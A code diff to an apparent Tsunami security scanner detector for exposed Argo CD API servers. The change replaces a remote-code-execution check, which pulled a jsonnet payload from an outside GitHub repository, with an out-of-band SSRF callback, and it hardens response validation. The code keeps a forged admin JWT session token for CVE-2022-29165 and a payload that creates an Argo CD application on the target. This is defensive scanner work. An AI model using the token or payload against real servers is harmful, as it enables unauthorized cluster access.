@@ -25,9 +25,12 @@ import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
 import com.google.common.util.concurrent.Uninterruptibles;
+import com.google.gson.JsonArray;
+import com.google.gson.JsonElement;
+import com.google.gson.JsonObject;
 import com.google.gson.JsonParseException;
 import com.google.gson.JsonParser;
-import com.google.gson.JsonSyntaxException;
+import com.google.gson.JsonPrimitive;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
@@ -55,7 +58,6 @@ import com.google.tsunami.proto.VulnerabilityId;
 import java.io.IOException;
 import java.time.Clock;
 import java.time.Duration;
-import java.time.Instant;
 import javax.inject.Inject;
 
 /** A {@link VulnDetector} that detects exposed ArgoCD API server. */
@@ -81,34 +83,11 @@ public final class ExposedArgoCdApiDetector implements VulnDetector {
   private final HttpClient httpClient;
   private final int oobSleepDuration;
 
-  // The URL that host the payload as a git repository
-  // This url might be changed in the future, so I make it easy to change
-  private final String PAYLOAD_GIT_URL = "https://github.com/JamesFoxxx/argo-cd-app";
-  // The Path to the directory of payload on the git repository
-  private final String PAYLOAD_GIT_PATH = "payloads/jsonnet-guestbook-tla";
-
   // The JWT session value as a part of the CVE-2022-29165 payload
   @VisibleForTesting
   static final String PAYLOAD_ARGOCD_TOKEN_SESSION =
       "argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."
           + "TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ";
-
-  // This is a template for creating an Argo CD application, we should fill four part of this
-  // payload.
-  private final String CREATE_APPLICATION_TEMPLATE =
-      "{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"Application\","
-          + "\"metadata\":{\"name\":\"tsunami-security-scanner\"},\"spec\""
-          + ":{\"destination\":{\"name\":\"\",\"namespace\":"
-          + "\"tsunami-security-scanner\",\"server\":"
-          + "\"%s\"},\"source\":{\"path\":"
-          + "\"%s\",\"repoURL\":"
-          + "\"%s\",\"targetRevision\":"
-          + "\"HEAD\",\"directory\":{\"jsonnet\":{\"tlas\":[{\"name\":"
-          + "\"payload\",\"value\":"
-          + "\"\\\"%s\\\"\""
-          + ",\"code\":true}]}}},\"sources\":[],\"project\":\"%s\","
-          + "\"syncPolicy\":{\"automated\":{\"prune\":false,"
-          + "\"selfHeal\":false}}}}";
 
   @Inject
   ExposedArgoCdApiDetector(
@@ -227,21 +206,42 @@ public final class ExposedArgoCdApiDetector implements VulnDetector {
 
     String targetUri = targetUrl + "api/v1/certificates";
     try {
-      // This is a blocking call.
+      // Do not follow redirects to unrelated landing pages (e.g. 302 -> /landing).
       HttpResponse response =
-          httpClient.send(get(targetUri).setHeaders(baseHeaders.build()).build(), networkService);
-      return response.status().isSuccess()
-          && response.bodyString().isPresent()
-          && response.bodyString().get().contains("\"items\"")
-          && response.bodyString().get().contains("\"metadata\"");
+          httpClient
+              .modify()
+              .setFollowRedirects(false)
+              .build()
+              .send(get(targetUri).setHeaders(baseHeaders.build()).build(), networkService);
+      return isValidArgoCdCertificatesResponse(response);
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
       return false;
-    } catch (JsonSyntaxException e) {
-      logger.atWarning().withCause(e).log(
-          "JSON syntax error occurred parsing response for target URI: '%s'.", targetUri);
+    }
+  }
+
+  private static boolean isValidArgoCdCertificatesResponse(HttpResponse response) {
+    if (!response.status().isSuccess()
+        || !(response.bodyJson().orElse(null) instanceof JsonObject root)
+        || !(root.get("metadata") instanceof JsonObject)
+        || !(root.get("items") instanceof JsonArray items)
+        || items.isEmpty()) {
       return false;
     }
+    for (JsonElement element : items) {
+      if (!(element instanceof JsonObject cert)
+          || !hasNonEmptyStringField(cert, "serverName")
+          || !hasNonEmptyStringField(cert, "certType")
+          || !hasNonEmptyStringField(cert, "certInfo")) {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  private static boolean hasNonEmptyStringField(JsonObject obj, String fieldName) {
+    return obj.get(fieldName) instanceof JsonPrimitive primitive
+        && !primitive.getAsString().isEmpty();
   }
 
   private boolean checkExposedArgoCdWithOutOfBandCallback(
@@ -307,12 +307,15 @@ public final class ExposedArgoCdApiDetector implements VulnDetector {
       }
       String payload =
           String.format(
-              CREATE_APPLICATION_TEMPLATE,
-              clusterName,
-              PAYLOAD_GIT_PATH,
-              PAYLOAD_GIT_URL,
-              callbackPayload.getPayload(),
-              projectName);
+              "{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"Application\","
+                  + "\"metadata\":{\"name\":\"tsunami-security-scanner\"},\"spec\""
+                  + ":{\"destination\":{\"name\":\"\",\"namespace\":"
+                  + "\"tsunami-security-scanner\",\"server\":"
+                  + "\"%s\"},\"source\":{\"path\":\".\",\"repoURL\":"
+                  + "\"%s\",\"targetRevision\":\"HEAD\"},\"sources\":[],\"project\":\"%s\","
+                  + "\"syncPolicy\":{\"automated\":{\"prune\":false,"
+                  + "\"selfHeal\":false}}}}",
+              clusterName, callbackPayload.getPayload(), projectName);
       String createAppUrl = targetUrl + "api/v1/applications?upsert=true";
       response =
           httpClient.send(
@@ -385,11 +388,10 @@ public final class ExposedArgoCdApiDetector implements VulnDetector {
     try {
       return this.payloadGenerator.generate(
           PayloadGeneratorConfig.newBuilder()
-              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
+              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
               .setInterpretationEnvironment(
-                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
-              .setExecutionEnvironment(
-                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+                  PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
+              .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
               .build());
     } catch (NotImplementedException n) {
       return null;
@@ -401,7 +403,7 @@ public final class ExposedArgoCdApiDetector implements VulnDetector {
     return DetectionReport.newBuilder()
         .setTargetInfo(targetInfo)
         .setNetworkService(vulnerableNetworkService)
-        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
+        .setDetectionTimestamp(Timestamps.fromMillis(utcClock.instant().toEpochMilli()))
         .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
         .setVulnerability(vulnerability)
         .build();
